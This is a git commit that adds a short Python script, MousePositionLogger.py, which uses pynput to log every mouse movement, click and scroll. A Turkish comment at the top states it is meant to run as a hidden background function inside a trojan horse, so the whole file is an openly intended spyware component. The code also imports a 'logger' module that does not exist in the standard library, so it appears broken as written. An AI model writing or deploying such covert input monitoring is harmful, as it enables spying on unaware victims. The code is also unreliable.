c52d26c0e7cdfebdc761ec1de77d38167ac7ed78
Mahmut P <109034196+C0derByM4H6301@users.noreply.github.com>
2023-04-16 23:55:02 +0300

    Add files via upload

---
+++ MousePositionLogger.py
@@ -0,0 +1,17 @@
+# truva atında bacground fuction olarak çalıştırılacak
+from pynput.mouse import Listener
+import logger
+
+
+def on_move(x, y):
+    logger.info("Mouse moved to ({0}, {1})".format(x, y))
+
+def on_click(x, y, button, pressed):
+    if pressed:
+        logger.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
+
+def on_scroll(x, y, dx, dy):
+    logger.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
+
+with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
+    listener.join()
